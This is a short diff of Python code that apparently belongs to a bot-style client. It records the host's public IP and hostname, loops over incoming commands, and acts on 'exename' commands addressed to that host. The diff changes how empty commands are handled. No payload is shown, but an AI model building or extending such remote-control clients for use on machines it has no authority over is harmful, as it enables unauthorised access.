@@ -9,6 +9,7 @@ try:
 
     old_command = ""
     command = ""
+    loop = 0
 
     ip = get('https://api.ipify.org').content.decode('utf8')
     hostname = uname()[1]
@@ -53,9 +54,14 @@ while True:
         localcmd = None
         if old_command != command:
             try:
-                if command == "again":
-                    old_command = None
-                    continue
+                if command == "":
+                    old_command = ""
+                    if loop == 1:
+                        loop = 0
+                        pass
+                    else:
+                        loop = 1
+                        continue
                 if command.startswith("exename "):
                     localcmd = command.split()
                     if localcmd[1] == hostname:
